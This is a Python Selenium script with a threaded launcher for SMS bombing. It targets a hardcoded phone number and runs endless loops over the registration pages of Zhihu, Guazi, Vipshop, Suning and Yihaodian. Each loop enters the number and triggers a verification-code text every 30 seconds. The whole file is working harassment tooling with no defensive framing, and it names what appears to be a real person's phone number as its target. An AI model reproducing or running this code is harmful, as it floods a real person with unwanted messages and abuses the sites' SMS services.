from selenium import webdriver
import time
from threading import Thread
class HongZha(object):
  def __init__(self):
    self.phone = "18581897806"#你要轰炸的电话号码
    self.num = 0
  def send_yzm(self,button,name):
    button.click()
    self.num+=1
    print("{}  第{}次  发送成功  {}".format(self.phone,self.num,name))
    time.sleep(30)
  def zhihu(self,name):
    while True:#下面这行是刚刚叙说的chromedrive的安装路径
 
      driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe")
      driver.get("https://www.zhihu.com/question/39993344")
      driver.find_element_by_xpath ( "//button[@class='Button Button--primary Button--blue']" ).click ()
      time.sleep(2)
      tel = driver.find_element_by_xpath("//input[@placeholder='手机号']")
      tel.send_keys(self.phone)
      button = driver.find_element_by_xpath ( "//button[@class='Button CountingDownButton SignFlow-smsInputButton Button--plain']" )
      self.send_yzm(button,name)
      driver.quit ()
  def guazi(self,name):
    while True:
      driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe")
      driver.get("https://www.guazi.com/www/bj/buy")
      a_btn = driver.find_element_by_xpath ( "//a[@class='uc-my']" )
      a_btn.click()
      time.sleep(2)
      tel = driver.find_element_by_xpath("//input[@placeholder='请输入您的手机号码']")
      tel.send_keys( self.phone )
      button = driver.find_element_by_xpath("//button[@class='get-code']")
      self.send_yzm(button,name)
      driver.quit()
  def wphui(self,name):
    while True:
      driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe")
      driver.get ( "https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F" )
      tel = driver.find_element_by_xpath ( "//input[@placeholder='请输入手机号码']" )
      tel.send_keys ( self.phone )
      driver.find_element_by_xpath ( "//input[@id='J_mobile_code']" ).click()
      button = driver.find_element_by_xpath (
        "//a[@class='ui-btn-medium btn-verify-code ui-btn-secondary']" )
      self.send_yzm ( button,name )
      driver.quit ()
  def suning(self,name):
    while True:
      driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe")
      driver.get ( "https://reg.suning.com/person.do" )
      driver.find_element_by_xpath("//a[@class='agree-btn']").click()
      tel = driver.find_element_by_xpath ( "//input[@id='mobileAlias']")
      tel.send_keys ( self.phone )
      button = driver.find_element_by_xpath (
        "//a[@id='sendSmsCode']" )
      self.send_yzm ( button,name )
      driver.quit ()
  def yhd(self,name):
    while True:
      driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe")
      driver.get ( "https://passport.yhd.com/passport/register_input.do" )
      driver.find_element_by_xpath ( "//input[@id='userName']" ).send_keys("我的女神daadaamnabajhdja")
      tel = driver.find_element_by_xpath ( "//input[@id='phone']" )
      tel.send_keys ( self.phone )
      time.sleep(2)
      button = driver.find_element_by_xpath (
        "//a[@class='receive_code fl same_code_btn r_disable_code ']" )
      #button.click()
      time.sleep(1)
      self.send_yzm ( button,name )
      driver.quit ()
from threading import Thread
 
from sendPhon import HongZha
 
hongzha = HongZha()
zhihu = Thread(target=hongzha.zhihu,args=("知乎",))
guazi = Thread ( target=hongzha.guazi,args=("瓜子",))
wphui = Thread(target=hongzha.wphui,args=("唯品会",))
suning = Thread(target=hongzha.suning,args=("苏宁",))
yhd= Thread( target=hongzha.yhd,args=("一号店",))
zhihu.start()
guazi.start()
wphui.start()
suning.start()
yhd.start()
